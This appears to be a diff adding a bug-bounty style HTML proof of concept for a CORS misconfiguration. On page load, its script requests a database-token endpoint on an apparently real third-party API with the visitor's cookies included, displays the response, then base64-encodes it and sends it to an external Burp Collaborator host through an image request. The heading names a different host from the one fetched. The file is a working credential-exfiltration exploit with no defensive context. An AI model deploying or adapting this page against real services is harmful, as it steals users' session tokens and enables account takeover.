@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>CORS PoC</title>
+</head>
+<body>
+
+<h2>CORS PoC — api1.test.com</h2>
+
+<pre id="output">Waiting…</pre>
+
+<script>
+fetch("https://api1.princess.com/resdb/p1.0/dbtoken/", {
+    method: "GET",
+    credentials: "include"
+})
+.then(r => r.text())
+.then(d => {
+    // Show response in page
+    document.getElementById("output").textContent = d;
+
+    // OPTIONAL: send to Burp Collaborator
+    const encoded = btoa(unescape(encodeURIComponent(d)));
+    const img = new Image();
+    img.src = "https://qgaznz624qo8sxqjhm2m2lm08rej28.oastify.com/?data=" + encoded;
+})
+.catch(e => {
+    document.getElementById("output").textContent =
+      "Blocked or failed:\n" + e;
+});
+</script>
+
+</body>
+</html>
